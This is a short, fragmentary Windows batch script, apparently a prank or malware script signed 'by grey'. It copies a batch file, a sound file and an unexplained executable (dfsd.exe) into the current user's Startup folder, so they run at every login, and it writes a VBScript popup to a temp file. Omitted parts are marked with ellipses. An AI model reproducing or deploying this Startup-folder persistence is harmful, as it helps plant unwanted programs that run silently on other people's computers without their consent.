...
xcopy "vis.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy "music.wav" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy "dfsd.exe" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
...
echo S.popup "by grey",0, "by grey",0+16 >> %temp%\temp.vbs 
